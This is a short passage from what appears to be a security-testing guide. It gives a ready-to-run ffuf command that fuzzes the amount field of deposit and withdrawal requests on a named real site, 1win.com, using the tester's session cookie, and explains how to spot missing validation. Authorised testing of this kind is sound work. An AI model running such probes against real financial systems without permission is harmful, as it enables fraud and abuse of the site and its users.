## Step 2: Execute FFUF against Deposit/Withdrawal Endpoints
Include your active test session cookies/headers using the -H flag so the server recognizes your account:

ffuf -w finance_payloads.txt -u https://1win.com -X POST -H "Cookie: session=YOUR_SESSION_COOKIE" -H "Content-Type: application/json" -d '{"amount": FUZZ, "currency": "USD"}' -t 1 -rate 5 -fc 400


* Verification Filter (-fc 400): This filters out standard "Bad Request" validation errors. If a request returns an HTTP 200 OK or updates your transaction history status, the backend is failing to validate boundaries.

